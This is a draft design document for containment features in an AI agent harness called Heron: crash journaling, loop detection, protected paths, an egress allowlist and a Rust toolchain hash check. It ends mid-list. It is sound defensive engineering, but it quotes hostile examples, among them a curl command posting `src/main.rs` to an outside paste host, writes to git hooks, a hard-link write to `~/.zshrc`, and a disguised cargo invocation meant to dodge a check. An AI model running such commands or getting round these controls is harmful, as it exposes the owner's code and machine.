# Heron harness safety: effect journal, loop guard, protected paths and egress

*   **Author:** fernandogarzaaa (drafted with Claude)
*   **Status:** Draft
*   **Date:** 2026-11-22
*   **Read at:** `main` = `39dbdf5`
*   **Depended on by:** [heron-harness2.md](heron-harness2.md) (branch `docs/heron-harness2`), requirement **Pre-5**. This doc fixes the two interfaces Pre-5 names: the effect journal's ask-again hook ([§1.5](#15-the-ask-again-hook-the-interface-pre-5-names)) and the toolchain hash check ([§3.4](#34-the-toolchain-hash-check-the-interface-pre-5-names)).
*   *Drafted with EGM*

--------------------------------------------------------------------------------

## Overview

This doc covers three upgrades to the code around Heron's model (the harness). The owner has approved building all three.

*   **U1, the effect journal.** Before Heron runs a tool call that changes something, it writes "about to run X" to its database. Afterwards it writes "did X" and the outcome. If Heron crashes in between, it never re-runs X on its own. Instead the user gets an approval: "X was interrupted. Run again?"
*   **U2, the loop guard (`RepeatGuard`).** Heron already notices one call repeated with the same result. U2 also catches two or three calls repeating in turn (A-B-A-B, A-B-C-A-B-C), and failures that differ only in their numbers. When it is sure the model is stuck, it stops the turn and says why.
*   **U3, protected paths, an egress allowlist and a toolchain check.**
    *   **Protected paths:** files that run code later are read-only to the agent. Examples are git hooks, `.envrc`, `.mcp.json`, shell rc files, launch agents, and Heron's own config and database. Heron hashes them again after each run and posts a notice if one changed.
    *   **Egress allowlist:** a sandboxed shell command can reach only an allowlist of hosts.
    *   **Toolchain check:** sandboxed commands may still write to the Rust toolchains. Heron hash-checks the toolchain binaries and refuses to run cargo or rustc on a mismatch.

Every piece reuses an existing seam: `execute_call` (`src/agent.rs:613`), the loop nudge (`src/agent.rs:558-566`), parked approvals and the `job_runs` recovery pattern (`src/store.rs:1059-1300`), the Seatbelt profile builder (`src/sandbox.rs:354`) and `classify_path` (`src/permissions.rs:1117`).

## The Problem

Four weaknesses were found in Heron on `main`. The harness research found the first three (`00-synthesis.md`, "Gaps"). The fourth comes from Seatbelt's design.

1.  **A crash can leave an action half-known.**
    *   `job_runs` and parked approvals are already marked "unknown" after a crash (`recover_interrupted_jobs`, `recover_interrupted_approvals`).
    *   The tool calls a turn makes are not. A chat turn that crashed while sending an email or running `git commit` leaves no record that the call started. After a restart, the conversation shows a tool call with no result.
    *   Harness2's self-heal loop needs this record before it can run unattended: "A crash interrupted it: the effect journal (Pre-5) asks 'Repair #N was interrupted. Run again?'" (`heron-harness2.md`, "When a run fails").
2.  **Only one kind of loop is caught.**
    *   The current check is one exact `name:arguments` signature repeated (`src/agent.rs:558-566`). It only appends a nudge and never stops the turn.
    *   A model that alternates `read_file a` and `list_dir b` spends the whole step budget, which is 40 steps by default (`src/config.rs:306`).
    *   So does a model that re-runs a failing test whose output differs only in timings.
3.  **Files that run code later are writable.**
    *   `classify_path` treats any write inside the working folder as `WorkspaceWrite` (`src/permissions.rs:1132`). So `.git/hooks/pre-commit`, `.envrc` and `.mcp.json` in the working folder are ordinary writes.
    *   The shell sandbox allows writes anywhere in the working folder.
    *   Each of those files runs code later, outside any sandbox: the next `git commit`, the next `cd` with direnv, the next Claude Code session.
    *   Outside the working folder, a write is `Privileged` and asks. One approval of a misread request then edits `~/.zshrc`.
4.  **Sandboxed commands can reach any host, and can change the compiler the owner runs.**
    *   The shell profile starts from `(allow default)` and never restricts the network (`src/sandbox.rs:356`). A build script, an npm `postinstall` hook or a prompt-injected command can post the working folder to any host.
    *   `~/.rustup/toolchains` and `~/.cargo/registry` are writable from the sandbox (`writable_extras`, `src/sandbox.rs:193-195`), because builds need them.
    *   So a sandboxed command can replace `rustc`. The replaced `rustc` then runs, unsandboxed, the next time anyone builds: the owner's terminal, rust-analyzer, Claude Code or skein.

## Goals

*   **G1.** No tool call that changes something (`Effect::mutates()` is true, `src/permissions.rs:89`) is re-run after a crash without a fresh yes from the user. Each one becomes exactly one waiting approval, whether it came from the model, an automation step or a parked approval.
*   **G2.** Other modules can record an action at the run level and get the same ask-again behaviour, with yes and no both reaching them. Harness2's interrupted repair is the first user.
*   **G3.** A turn stops, with a notice that names the calls, when either of these happens:
    *   one block of 1, 2 or 3 calls repeats 4 times in a row with the same results;
    *   a failing call repeats with output that differs only in its digits.
*   **G4.** `write_file`, `edit_file` and any sandboxed shell command cannot create, change, rename or delete a protected path. No rule, approval or permission mode opens one.
*   **G5.** After every run that changed something, Heron compares the protected paths with their state at the start of the run. Any difference produces a notice and an inbox entry.
*   **G6.** On macOS, a sandboxed shell command reaches the internet only through Heron's proxy, and only to allowlisted hosts on port 443. A blocked host is named in the command's output.
*   **G7.** A Rust toolchain that changed since the owner last trusted it is never used by a *later* sandboxed shell command. Seatbelt enforces this. The command that made the change can still use it before it ends. The change is reported right after the command that made it.
*   **G8.** Linux and Windows build and behave as today.

## Non-Goals

*   **Anything in [heron-harness2.md](heron-harness2.md).** Self-healing, self-evolution, connectors and observation are out of scope here. This doc only supplies Pre-5.
*   **A completion-decided run status.** It is not cheap. A Heron chat turn has no goal that a machine can check, so each task kind would need its own check definition. Harness2 already uses CI as its check for repairs.
*   **Resuming a crashed turn.** anchor-harness's journal reuses a stored result to resume a run (`effects.rs`, `AlreadyCommitted`). Heron does not resume turns after a crash, so it needs intent and outcome only.
*   **Re-running "idempotent" calls on their own.** The owner rule is "never silently".
*   **Egress filtering for the CLI provider children** (claude, codex), or for Heron's own in-process network tools (`web_fetch`, MCP, connectors). The CLIs need their model API hosts. The in-process tools already go through taint and the permission gate.
*   **Linux and Windows sandbox changes.** bubblewrap keeps today's rules, and Windows still has no sandbox. The file-tool half of protected paths works on every platform, because it lives in `classify_path`.
*   **opencode.** The owner has deferred it.
*   **Filtering what is sent to an allowed host.** The proxy does not decrypt TLS, so it can't tell `git fetch` from `git push` on `github.com`. See [Security](#security-and-privacy).

## Owner decisions

The owner made these decisions (2026-11-22). Each one stands until the owner changes it. Defaults proposed by this draft are in [Open Questions](#open-questions), not here.

*   **OD1, the effect journal.** Heron records "about to run X (tool, args hash, session, run)" before each tool call that changes something, and "did X (outcome)" after. An intent with no outcome after a crash is never re-run silently. It becomes an approval that asks again: "This was interrupted. Run again?"
*   **OD2, no journal for reads.** Read-only effects are not journaled.
*   **OD3, completion status only if cheap.** A completion-decided run status is built only if cheap. This doc finds it is not cheap, so it is a non-goal.
*   **OD4, the loop guard.** `RepeatGuard` detects A-A, A-B and A-B-C cycles and results that differ only in numbers, and stops the turn with a clear notice. It extends the existing loop check rather than adding a second one, and it is ported from anchor-harness `repeats.rs`.
*   **OD5, protected paths.** anchor-harness's list is read-only to the agent: git hooks, `.envrc`, `.mcp.json`, shell rc files, `~/Library/LaunchAgents`, and Heron's own config and database. This covers `write_file`, `edit_file` and the shell sandbox. Heron hashes the list again after each run and posts a notice if anything changed.
*   **OD6, egress allowlist.** The allowlist is on for sandboxed shell commands.
*   **OD7, toolchain writes and the hash check.** Sandboxed writes to `~/.rustup/toolchains` and `~/.cargo/registry` stay allowed. Before Heron next uses the toolchain binaries, it hash-checks them and refuses on a mismatch. "Uses" means Heron running cargo or rustc in its shell. See OQ1 for the stress test.
*   **OD8, scope.** Out of scope: anything in heron-harness2.md, Linux and Windows sandboxes beyond not breaking them, and opencode.
*   **Invariants that must not weaken:**
    *   **I1.** The sandbox is on by default.
    *   **I2.** A tainted conversation's grants never reach the shell.
    *   **I3.** "Never" rules are lifted only in the app.
    *   **I4.** Memory never trusts outside content.

    [§4](#4-how-each-invariant-is-kept) says how this design keeps each one.

## Open Questions

Each question has a proposed default. The build uses the default unless the owner changes it.

*   **OQ1, OD7 checks the toolchain too late. Proposed: keep OD7, and add three things.**
    *   **The finding.** The real risk is not Heron's next use: Heron's next use is sandboxed anyway. The risk is the owner's next unsandboxed use. rust-analyzer runs `cargo check` within seconds of a file save, and the owner's terminal, Claude Code sessions and skein nodes all run cargo too. Any of them can run a replaced `rustc` before Heron checks anything.
    *   **The three additions:**
        1.  The check also runs after every sandboxed shell command. A change is reported before the owner's next command, not at Heron's next cargo call.
        2.  Seatbelt denies reads of a changed toolchain, so no route through the shell can use it.
        3.  The notice names the command that made the change.
    *   **What this still leaves open.** Between the end of the bad command and the owner reading the notice, rust-analyzer can still run the replaced binary.
    *   **The stronger option.** Deny sandbox writes to `~/.rustup/toolchains/*/{bin,lib}`, and keep `~/.cargo/registry` writable. A sandboxed command could then no longer install a toolchain. Today that happens when cargo meets a `rust-toolchain.toml` pin that isn't installed: Heron pins `1.99.1` in its own `rust-toolchain.toml`. Builds on installed toolchains keep working. **The owner decides.**
*   **OQ2, `~/.cargo/registry/src` is the same risk, and is not covered. Proposed: record it as an open risk in the threat model for now, and revisit it with OQ1.**
    *   Cargo does not re-verify extracted crate sources. A sandboxed command that edits `~/.cargo/registry/src/*/<crate>/build.rs` gets that code run by the owner's next unsandboxed build of any project that uses the crate.
    *   Hashing the folder costs too much: it is 1.2 GB on the owner's Mac.
    *   The structural fix is to give sandboxed commands their own `CARGO_HOME` registry. That doubles the disk use and loses the shared cache, so it is listed under Future Improvements.
*   **OQ3, more protected names than the owner listed. Proposed: add them.** Each one runs code later in the same way as the listed ones.
    *   **`.git/config`.** Its `core.hooksPath`, `core.fsmonitor` and filter settings run code. Without it, the hooks rule can be stepped around in one line.
    *   **anchor-harness's workspace names:** `.gitmodules`, `.husky`, `.claude`, `.vscode`, `.idea` and `.ripgreprc`. `.vscode/tasks.json` and `.claude/settings.json` hooks run code when a folder is opened.
    *   **`~/.gitconfig`, `~/.config/git/`** and **`~/.cargo/config.toml`** (`build.rustc-wrapper`).
    *   **The default `~/.heron` as well as `cfg.home`,** so a Heron started with `HERON_HOME` set elsewhere still protects the owner's real home.
*   **OQ4, loopback stays open. Proposed: allow outbound connections to `localhost:*`, minus a configured deny list (`agent.deny_local_ports`, empty by default).**
    *   **Why.** Heron's own tests bind `127.0.0.1:0` and connect (`src/server.rs:2269`, `src/telegram.rs:973`). Harness2's repair runs `cargo test --locked` under this profile, so a loopback deny would break it. Seatbelt can't express a port range, so an ephemeral-port allowance can't be written.
    *   **What stays open.** A local process that forwards traffic onward bypasses the allowlist. Examples are an HTTP debugging proxy, an `ssh -D` tunnel, or the Axiom proxy on `127.0.0.1:8080`.
    *   **Heron's own API port is always denied**, whatever the setting. The server records its port in kv `server:port` when it starts, and the shell profile denies that port. The API token is also out of reach: it is held in memory, handed to the app over the core's stdout (`endpoint_line`, `src/server.rs:267-269`) or printed as a launch URL, and never written under a path the sandbox can read.
    *   **Proposed for the owner's own config:** `deny_local_ports = [8080]`.
*   **OQ5, `github.com` and `registry.npmjs.org` accept uploads. Proposed: keep both on the default list.**
    *   Both hosts accept authenticated writes (`git push`, `npm publish`). So a command carrying an attacker's token could still send data out through them.
    *   They are kept because without them `git clone` of public repositories and every `npm install` break.
    *   Three things narrow the gap:
        *   `publish` commands are already `Forbidden` (`src/permissions.rs:684`);
        *   in a tainted conversation every shell command asks;
        *   `crates.io` itself, which is the API host for `cargo publish`, is left off the list.
*   **OQ6, who may change the egress list or re-trust the toolchain. Proposed:** both are changed only through Heron's authenticated API, from the app's Settings. The same is true of a "never" lift. No agent tool can do either, because `config.toml` and `heron.db` are Refused to the agent.

**Prototype checks.** The build session runs these unsandboxed on the owner's Mac before `skein run` (Pre-S2). A failure changes the design before any code is written.

*   **PT-E1, the Seatbelt network rules compile and behave as intended.** Run a profile with the rules from [§3.2](#32-the-egress-allowlist) under `sandbox-exec -p`. Then check each of these:
    *   `curl --noproxy '*' https://example.com` fails;
    *   `python3 -c "import socket; socket.getaddrinfo('example.com', 443)"` fails;
    *   inside the profile, `python3 -c "import socket; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(); socket.create_connection(s.getsockname())"` succeeds. This is the shape of Heron's own server tests. It is why the profile denies only `network-outbound`, not anchor-harness's `network*`, which also covers bind and inbound;
    *   `curl -x http://127.0.0.1:<proxy> https://static.crates.io/` succeeds;
    *   the same command with `::1` in place of `127.0.0.1` behaves the same.

    anchor-harness's profile (`crates/harness-runtime/src/sandbox.rs:217-237`) is the tested starting point. The one new rule is `(allow network-outbound (remote ip "localhost:*"))`, so check that rule hardest.
*   **PT-E2, real package fetches work through the proxy.** In a scratch crate, run each of these through the proxy with only the default allowlist:
    *   `cargo fetch` with an empty `CARGO_HOME`;
    *   `npm view left-pad`;
    *   `uv pip download six`;
    *   `git clone https://github.com/rust-lang/rustlings`.

    Record any extra host they need. The sparse index's `config.json` names `dl = https://static.crates.io/crates` and `api = https://crates.io`. Read on the owner's Mac.
*   **PT-P1, hard links.** In a sandboxed shell, run `ln ~/.zshrc ./z && echo x >> ./z`. Record whether Seatbelt refuses it. If it does not, the rehash ([§3.3](#33-the-after-run-rehash)) is the only control for this case, and the threat model must say so.
*   **PT-T1, auto-install.** With `rust-toolchain.toml` pinning a channel that isn't installed, run `cargo --version` sandboxed. Record whether rustup 1.29.2 installs the channel, and whether `RUSTUP_AUTO_INSTALL=0` stops it.

## Critical User Journeys (CUJs)

### CUJ 1: A crash during a side effect

*   **Given:** a chat turn asks Heron to commit. The `shell` call for `git commit -m "…"` has started.
*   **When:** the Heron core is killed before the command returns. The app restarts it.
*   **Then:**
    *   The Approvals list shows one item: "Run `git commit -m …` was interrupted. Run again?" Its detail reads: "Heron stopped while doing this. It may or may not have finished. Check before running it again."
    *   **Run again** re-checks today's rules and the taint the call had, then runs it once.
    *   **Dismiss** closes it.
    *   Nothing runs before the user answers.

### CUJ 2: An interrupted Harness2 repair (Pre-5)

*   **Given:** Harness2 started repair #12. It recorded a run-level action, handler `selfheal.repair` with subject `12`, before spawning the repair process.
*   **When:** the main process crashes, and the next Heron that owns background work starts.
*   **Then:**
    *   The Approvals list shows "Repair #12 was interrupted. Run again?"
    *   **Run again** calls Harness2's resumer, which re-queues the repair.
    *   **Dismiss** calls its `declined`, which sets `triggers.state` to `cancelled`.

### CUJ 3: An A-B loop

*   **Given:** the model calls `read_file notes.md` and then `list_dir .`, again and again, with the same results.
*   **When:** the block has repeated 4 times, at the 8th call.
*   **Then:**
    *   The turn stops calling tools. The app shows the notice "stopped: the same 2 calls (read_file, list_dir) repeated 4 times with the same results".
    *   The model gets one tool-less closing call. It tells the user what is blocking it, the same way as at the step limit.

### CUJ 4: A failing test with changing timings

*   **Given:** `cargo test` fails 4 times in a row. The output differs only in `finished in 0.4Xs` and the process ids.
*   **When:** the 4th failure arrives.
*   **Then:** the turn stops with "stuck: 4 identical shell calls in a row with the same result".
*   **But:** 10 successful runs whose counts change ("3 passed", "4 passed") do not stop it.

### CUJ 5: Writing a git hook

*   **Given:** the working folder is a git repository.
*   **When:** the model calls `write_file .git/hooks/pre-commit`, or runs `echo x >> .git/hooks/pre-commit` in the shell.
*   **Then:**
    *   The file tool is refused before anything is asked: "Heron never changes files that run code later (git hooks)."
    *   The shell command fails with "Operation not permitted" from Seatbelt.
    *   Both outcomes are in the audit log.

### CUJ 6: A protected file changes anyway

*   **Given:** a turn ran shell commands.
*   **When:** `.envrc` in the working folder differs at the end of the turn from its state before the turn's first side-effecting call. It might be the owner editing it at the same time, or a gap in the sandbox.
*   **Then:**
    *   The app shows the notice "A protected file changed while Heron was working: .envrc. If you didn't change it, check it before you next use this folder."
    *   An inbox entry and an audit row (`protected-path-changed`) record the same.

### CUJ 7: A build fetches crates, and an unknown host is blocked

*   **Given:** egress is set to `allowlist`, with the default list.
*   **When:** the model runs `cargo build`, then `curl https://paste.example.net -d @src/main.rs`.
*   **Then:**
    *   cargo downloads from `index.crates.io` and `static.crates.io` through the proxy.
    *   curl fails. Its output ends with "[network] blocked paste.example.net:443: not on the sandbox's egress allowlist. Do not work around this; tell the user, who can add the host in Settings."

### CUJ 8: The toolchain changes in the sandbox

*   **Given:** the stable toolchain is trusted.
*   **When:** a sandboxed command overwrites `~/.rustup/toolchains/stable-aarch64-apple-darwin/bin/rustc`.
*   **Then:**
    *   **Right after the command:** its output ends with "[toolchain] the Rust toolchain stable-aarch64-apple-darwin changed during this command (bin/rustc). Heron won't use it until you trust it in Settings." The inbox says the same.
    *   **The next cargo command:**
        *   It is refused before it starts.
        *   If it is disguised (`sh -c 'car''go b'`), Seatbelt denies reading that toolchain folder.
    *   **The owner:** after checking, presses **Trust the Rust toolchain as it is now** in Settings › Sandbox, or reinstalls it with `rustup toolchain install --force` in their own terminal and then trusts it.

## Technical Plan (Architecture)

```text
                     ┌──────────────── Agent::run_turn (src/agent.rs) ────────────────┐
model tool calls ──▶ │ execute_call ──▶ Policy::decide ──▶ approver                    │
                     │      │                                                          │
                     │      ▼  (Effect::mutates)                                       │
                     │ journal::guarded(intent) ──▶ tool.call ──▶ journal outcome      │
                     │      │ first mutating call of the run                           │
                     │      └──▶ protect::watch_begin(session)                         │
                     │ RepeatGuard.observe(call, ok, result) ──▶ nudge │ stop turn      │
                     │ end of run ──▶ protect::watch_end ──▶ notice if changed         │
                     └─────────────────────────────────────────────────────────────────┘
run_parked (src/app.rs) ──▶ journal::guarded ──▶ tool.call │ resume:<handler> ──▶ Resumer
own_background_work / scheduler tick ──▶ journal::recover ──▶ park_approval("… Run again?")

shell tool (src/tools/shell.rs), per command:
  toolchain::check (before) ──refuse if a Rust tool is named and the toolchain is untrusted
  egress::start(allowlist) ──▶ 127.0.0.1:<port>  (CONNECT :443, public address, SNI = host)
  sandbox::seatbelt_profile(... protect rules, network rules, untrusted toolchain denies)
  sandbox-exec bash -c <cmd>   env: HTTPS_PROXY=http://127.0.0.1:<port>, NO_PROXY=localhost,...
  egress decisions ──▶ "[network] blocked …" lines;  toolchain::check (after) ──▶ notice
```

Five new modules hold the logic. Each is unit-tested without the rest. The existing files call into them at the seams named above.

| Module | Holds | Persists in |
|---|---|---|
| `src/journal/` | Intent and outcome records, process leases, recovery, the ask-again hook | A new `effects` table in `heron.db`, plus lease files in `<home>/journal/` |
| `src/repeat/` | `RepeatGuard`, ported | Nothing (per turn) |
| `src/egress/` | The CONNECT proxy, the host check, the Seatbelt network rules | Nothing (one proxy per command) |
| `src/protect/` | The protected list, the write check, the Seatbelt write rules, snapshots | Nothing (per run, in memory) |
| `src/toolchain/` | The toolchain manifest, the stat-then-hash check, trust | kv `toolchain:baseline` and kv `toolchain:changed` |

### 1. U1, the effect journal

#### 1.1 What is journaled

A call is journaled when its effect `mutates()` (`src/permissions.rs:89`):

*   `LocalStateWrite`, `WorkspaceWrite` and `SensitiveWrite`;
*   `ProcessExec`, `ExternalWrite` and `Privileged`.

This is Heron's existing definition of "changes something", and read-only mode refuses exactly this set.

`LocalRead`, `NetworkRead`, `SensitiveRead`, `OutsideRead` and `NetworkEgress` are not journaled. `NetworkEgress` sends a query, such as a search or a read-only connector call. Repeating one changes nothing, so asking again would be noise (OD2). Refused and Forbidden calls never run, so they have nothing to journal. `delegate` is not a tool: the child agent's own calls are journaled.

#### 1.2 The record

There is one new table, `effects`, added as data-format step 4 (after `to_v3`, `src/store.rs:190`).

| Column | Meaning |
|---|---|
| `id` | Row id |
| `started_at`, `finished_at` | Unix seconds |
| `proc` | The id of the writing process (a UUID made at the first write) |
| `session_id`, `run_id`, `origin` | Which conversation, which run, and what Heron was doing (the session's `Origin`, or the approval's origin) |
| `kind` | `tool` or `action` |
| `name` | The tool name, or the action's handler name (for example `selfheal.repair`) |
| `args` | The full arguments JSON (tool), or the subject (action). **Set to NULL when the outcome is written** |
| `args_hash` | SHA-256 of the canonical (key-sorted) arguments, which are kept |
| `summary`, `risk`, `tainted` | As shown in an approval |
| `state` | `intent` → `done` / `failed`, or `intent` → `interrupted` → `asked` |
| `outcome` | A redacted preview of up to 300 characters, as the audit log keeps |
| `approval_id` | The approval that asks again, once one exists |

*   **Why the full arguments.** The owner listed an args hash. A re-run needs the arguments themselves, so the row keeps them only while the intent is open. This is the same data the `approvals` table already keeps for every parked request. `heron.db` is Refused to the agent and matches a secret pattern in the sandbox.
*   **Retention.** Finished rows older than 30 days are deleted by `Store::maintain`.
*   **Run ids:**
    *   `turn:<uuid>` for a turn at depth 0, which sub-agents inherit;
    *   `job:<job_runs.id>` for a scheduled job or automation;
    *   `parked:<approval id>` for `run_parked`;
    *   `action:<handler>:<subject>` for a run-level action.

The run id is a field on `Agent`, set in `run_turn` at depth 0 and copied into the child by `delegate`'s clone. `ToolCtx` is unchanged, which avoids editing its 32 literal constructions.

#### 1.3 One helper on both execution paths

`journal::guarded(store, intent, future)` writes the intent row and commits it. It then awaits the tool future and writes the outcome. Two callers use it:

*   `execute_call`, around `tool.call` (`src/agent.rs:685`). This also covers automations, because `Agent::call_tool` goes through `execute_call`.
*   `run_parked`, around its direct `tool.call` (`src/app.rs`, in `run_parked`).

On durability, the intent is its own committed transaction before the tool starts. The rusqlite bundled SQLite defaults to `synchronous=FULL`, also in WAL mode, so a process crash never loses it. A power loss can, because macOS `fsync` is not `F_FULLFSYNC`. That case is accepted and stated in the threat model. The cost is two small commits per side-effecting call.

#### 1.4 Recovery, and telling a live process from a dead one

Several Heron processes can share one `heron.db`: the app's core, `heron chat` in a terminal, and `heron run`. Recovery runs only in the process that holds `background.lock` (`own_background_work`, `src/app.rs:2099-2117`), but even that process must never mark another live process's intent as interrupted.

*   **The lease.** At its first journal write, each process creates `<home>/journal/<proc>.lock` and holds an exclusive lock on it (`File::try_lock`, as `background.lock` already does) for its whole life. The operating system drops the lock when the process dies, whatever the cause.
*   **Recovery.** `journal::recover(store, home)` runs at the existing recovery point (`src/app.rs:2113-2114`), before `recover_interrupted_approvals`, and again on each `scheduler_loop` tick. That way a crashed terminal session is surfaced within a minute, not at the next app start. Recovery does three things:
    1.  It lists the distinct `proc` values with `intent` rows.
    2.  For each one whose lease file it can lock, the owner is dead. Its rows become `interrupted`, and the lease file is removed.
    3.  It turns each interrupted row into an ask-again approval ([§1.5](#15-the-ask-again-hook-the-interface-pre-5-names)) and records the `approval_id`.

    One transaction covers each process's rows, as in `recover_interrupted_jobs`, so no interrupted row is left without its approval.
*   **One path per action, so the user is told once.** A row whose run is `parked:<id>` is not given a new approval. Its original approval row goes back to `new`, with the ask-again summary. `recover_interrupted_approvals` then no longer finds it `running`, and leaves it alone. A parked approval that was claimed but never reached `journal::guarded` keeps today's `unknown` path, and then it is known that nothing ran.

#### 1.5 The ask-again hook (the interface Pre-5 names)

*   **Tool entries** reuse parked approvals unchanged:
    *   `park_approval(session_id, tool, args, summary, detail, risk, tainted, origin)`, where:
        *   `summary` = `"<tool summary> was interrupted. Run again?"`;
        *   `detail` = "Heron stopped while doing this. It may or may not have finished. Check before running it again.";
        *   `origin` = `"interrupted: <origin>"`.
    *   **Run again** → `POST /api/approvals/{id}` `approve` → `run_parked`. It already re-checks today's policy and the call's taint, including taint that arrived later for `shell` and walks (`src/app.rs:1788-1795`).
    *   **Dismiss** → `dismiss` (`src/server.rs:1183-1186`).
*   **Action entries** are for other modules. This is what Harness2 calls:

    ```text
    journal::register_resumer(handler: &'static str, resumer: Arc<dyn Resumer>)
    journal::begin_action(store, ActionIntent { handler, subject, label, session_id, origin }) -> EntryId
    journal::finish(store, id, Outcome::Done | Outcome::Failed(text))

    trait Resumer: Send + Sync {
        async fn rerun(&self, app: &App, subject: &str) -> Result<String>;   // user pressed Run again
        fn declined(&self, app: &App, subject: &str);                        // user pressed Dismiss
    }
    ```

    *   On recovery, an interrupted action becomes `park_approval(session_id, "resume:<handler>", {"subject": …}, "<label> was interrupted. Run again?", …, risk "exec", tainted from the intent, origin)`.
    *   `run_parked` sends a tool name starting with `resume:` to the registered resumer, not to the tool registry. The `claim_approval` step stays first, so two clicks never re-run it twice.
    *   `answer_approval`'s `dismiss` branch calls `declined` for the same names.
    *   A handler that no build has registered gets status `failed`, with "This Heron does not know how to resume <handler>."
    *   No model-visible tool can be named `resume:…`. Tool names are fixed in the registry, and `run_parked` handles the prefix before the registry lookup.
*   **What Harness2 does with it.** It records the action in the **main** `heron.db`, from the main process, before it spawns `heron-cli selfheal repair --run <id>`. The repair process uses its own disposable `HERON_HOME`, so its tool calls journal into that home's database, which is thrown away. The run-level row is what survives.
    *   **Run again:** `rerun` re-queues the trigger. If the repair child is somehow still running, Harness2 must check for it.
    *   **Dismiss:** `declined` sets `triggers.state = cancelled`.
    *   **While waiting:** Harness2 shows `interrupted`, which its own state list already has.
    *   The label is `"Repair #<id>"`, so the text is exactly "Repair #12 was interrupted. Run again?".

### 2. U2, the loop guard

*   **The port.** `src/repeat/mod.rs` is anchor-harness `crates/harness-core/src/repeats.rs` (204 lines), ported with its tests. Each fingerprint is the SHA-256 of `[tool, canonical input, ok, output]`, where a failed call's output has every run of digits replaced by `#`.
    *   `observe(limit, tool, input, ok, output)` returns a stop reason when the last `period × limit` calls are one block of `period` calls (1 to 3) repeated.
    *   `count()` returns how many identical calls end the history.
    *   The port's only change is to use `sha2` and `serde_json` canonical ordering directly. Heron has no `content_hash` helper.
*   **It replaces `recent_calls`.** `recent_calls` (`src/agent.rs:488`, `558-566`) is replaced, not joined, by one `RepeatGuard` per `run_turn` call. Sub-agents get their own, because they run their own `run_turn`.
    *   **The nudge stays:** when `count() >= 3` (today's threshold: a third identical call), the same text is appended. The test `untrusted_output_is_wrapped_and_repeats_are_flagged` (`src/agent.rs:1361`) keeps passing unchanged.
    *   **The stop is new:** when `observe` returns a reason, Heron finishes recording that batch's tool results and sends `Event::Notice(reason)`. Then it leaves the step loop for the existing tool-less closing call (`src/agent.rs:573-584`), with this notice in place of the step-limit one: "[system notice] You were stopped because you repeated the same calls with the same results (<reason>). Without calling any tools, tell the user what you tried, what is blocking you, and what they could do."
*   **`ok`.** `execute_call` returns text only. A result is a failure when it starts with `Error:` or `Permission denied`, which is the convention `call_tool` already uses (`src/agent.rs:590-597`).
*   **Digits are ignored only in failures.** This draft decides it, following anchor-harness. A success whose numbers change ("3 passed", then "4 passed", a growing file size) is progress. A failure whose only change is a timing or a pid is the same failure. The owner's wording, "results that differ only in numbers", is met for failures. For successes it would stop legitimate polling.
*   **The limit.** The limit is `agent.max_repeats`, default 4. 0 turns the stop off, and the nudge stays. It is an owner budget like `max_steps`.

### 3. U3, protected paths, egress and the toolchain

#### 3.1 The protected list and the write check

`src/protect/` defines the list, as compiled constants. Like the Refused list, this is not something the configuration can open.

*   **Names at any depth of the working folder.** Files: `.envrc`, `.mcp.json`, `.gitmodules`, `.ripgreprc`, `.bashrc`, `.bash_profile`, `.zshrc`, `.zprofile`, `.zshenv`, `.profile`. Folders: `.claude`, `.vscode`, `.idea`, `.husky`. This is anchor-harness's `WORKSPACE_NAMES`.
*   **Git, for each repository that exists when the check runs:**
    *   `<gitdir>/hooks/**` and `<gitdir>/config`.
    *   When `.git` is a file (a worktree or a submodule), Heron follows its `gitdir:` line and protects `<commondir>/hooks/**`, `<commondir>/config` and `<gitdir>/config.worktree`.
    *   A repository the agent creates during a run is not blocked, so `git init` and `git clone` keep working. The rehash checks it instead. A new repository may hold only git's sample hooks and the config keys in anchor-harness's `NEW_REPO_CONFIG_KEYS`.
*   **Paths in the user's home:**
    *   the shell rc files above, plus `.zlogin`;
    *   `.gitconfig`, `.config/git/` and `.cargo/config.toml`;
    *   `Library/LaunchAgents/`.
*   **Heron's own home:** `cfg.home` and the default `~/.heron`. Both are already Refused for reads and writes. They are listed again here so the rehash covers `config.toml` and `heron.db` (OQ3).

**The file tools.** `classify_path(path, workspace, cfg, write = true)` returns `Refused` when `protect::is_protected(path, workspace, home)` matches. This happens before the existing workspace and outside-write cases, and for every form of the path (as given, canonical, and the data-volume alias). So `write_file`, `edit_file` and every other writing file tool are refused in every mode, and no rule or approval opens them. Reads are unchanged.

**The shell sandbox.** `protect::seatbelt_rules(workspace, home, repos)` returns rules that `seatbelt_profile`'s `Shell` branch adds after the writable allowance (`src/sandbox.rs:387-388`):

*   a `(deny file-write* (regex …))` for each name at any depth under the working folder, written as `^<ws>/(.*/)?\.envrc$` or `^<ws>/(.*/)?\.vscode(/.*)?$`, case-insensitive through `seatbelt_regex`;
*   `(deny file-write* (subpath …) (literal …))` for each repository's hooks folder and config files, and for the home paths;
*   `refused_ancestors(protected, writable)` (`src/sandbox.rs:255`), reused unchanged, so a command can't rename a parent folder, write under the new name and rename it back. The cost: a folder that holds a repository can't be renamed or deleted from the sandbox.

The repository list comes from one bounded scan of the working folder. The scan skips `node_modules`, `target`, `.venv`, `venv` and `__pycache__`, and stops after 100,000 entries, which is anchor-harness's `scan`. It is taken once per run and cached under the session id (§3.3). A shell call outside any run, from `run_parked`, scans afresh.

#### 3.2 The egress allowlist

**The mechanism chosen: a local CONNECT proxy for each command, with Seatbelt allowing only loopback.**

Seatbelt's `network-outbound` filter accepts only `localhost` or `*` as the host. It can't name `static.crates.io`, and a fixed IP list would break every time a CDN rotates its addresses. So a host-level rule can only be applied by something that sees the host name, which means a proxy. Seatbelt's job is to make the proxy the only way out. anchor-harness already runs this design and tests it (`crates/harness-runtime/src/proxy.rs`, 792 lines). Heron ports it rather than writing a new one.

*   **The proxy.** `src/egress/` ports anchor-harness's `proxy.rs`. It listens on `127.0.0.1:0`, inside the Heron process and outside the sandbox. It accepts only `CONNECT host:443` and refuses everything else, plain-HTTP requests included. It allows a tunnel only when all three of these hold:
    1.  `host_allowed(allowlist, host)`, where an entry is an exact name or `*.suffix`;
    2.  the host resolves to a public address, so an allowed name that points at loopback, the LAN or `169.254.169.254` is refused;
    3.  the TLS ClientHello's server name equals the CONNECT host.

    It never decrypts TLS. It records every decision.
*   **Its lifetime.** One proxy is started for each shell command and dropped when the command returns. Two reasons:
    *   each command's blocked hosts can be appended to that command's own output;
    *   a background process that outlives its command loses its network.
*   **The Seatbelt rules.** They are added to the `Shell` profile only, and come from anchor-harness's tested lines plus the loopback rule in OQ4:
    *   deny all outbound network (`network-outbound` only; bind and inbound stay allowed, unlike anchor-harness's `(deny network*)`);
